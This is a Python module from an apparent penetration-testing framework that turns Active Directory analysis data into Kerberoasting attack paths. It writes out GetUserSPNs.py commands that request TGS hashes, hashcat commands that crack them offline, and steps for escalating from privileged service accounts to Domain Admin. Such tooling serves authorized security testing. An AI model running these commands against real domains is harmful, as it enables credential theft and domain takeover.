"""ReconForge AD Attack Paths — Kerberoasting opportunities.

Author: Andrews Ferreira
"""

from typing import Any

from modules.ad.attack_paths.base import (
    AttackChain,
    AttackPathBuilderBase,
    AttackPathResult,
    NextStepSuggestion,
)


class KerberoastPathBuilder(AttackPathBuilderBase):
    """Build Kerberoasting attack paths from SPN account data."""

    BUILDER_NAME = "kerberoast"

    def build(
        self, analysis_data: dict[str, Any],
        target: str = "", domain: str = "", **kwargs,
    ) -> AttackPathResult:
        result = AttackPathResult(builder=self.BUILDER_NAME)

        spn_accounts = analysis_data.get("spn_accounts", [])
        kerberoastable = analysis_data.get("kerberoastable", [])

        targets = kerberoastable or [a.get("username", "") for a in spn_accounts]
        if not targets:
            return result

        # Main Kerberoasting chain
        result.chains.append(AttackChain(
            name="Kerberoasting → Service Account Compromise",
            description="Service accounts with SPNs can be Kerberoasted",
            steps=[
                f"GetUserSPNs.py {domain}/<user>:<pass> -dc-ip {target} -request",
                "Crack TGS hashes with hashcat -m 13100",
                "Use service account credentials for privilege escalation",
            ],
            risk="high",
            prerequisites=["Valid domain credentials", "Service accounts with SPNs"],
            references=["https://attack.mitre.org/techniques/T1558/003/"],
            chain_type="kerberoast",
        ))

        # Check for privileged kerberoastable accounts
        privileged_users = set(analysis_data.get("privileged_users", []))
        priv_spn = [u for u in targets if u in privileged_users]
        if priv_spn:
            result.chains.append(AttackChain(
                name="Kerberoast Privileged Account → Domain Admin",
                description=f"Privileged SPN accounts: {', '.join(priv_spn[:5])}",
                steps=[
                    f"Kerberoast {priv_spn[0]} (privileged + has SPN)",
                    "Crack TGS hash offline",
                    f"Authenticate as {priv_spn[0]}",
                    "Escalate to Domain Admin via group membership",
                ],
                risk="critical",
                prerequisites=["Valid domain credentials"],
                chain_type="kerberoast",
            ))

        result.suggestions.append(NextStepSuggestion(
            command=f"GetUserSPNs.py {domain}/ -dc-ip {target} -request -outputfile tgs_hashes.txt",
            justification=f"Kerberoast {len(targets)} accounts with SPNs",
            priority="high",
        ))
        result.suggestions.append(NextStepSuggestion(
            command="hashcat -m 13100 tgs_hashes.txt wordlist.txt",
            justification="Crack Kerberoast TGS hashes offline",
            priority="high",
        ))

        return result
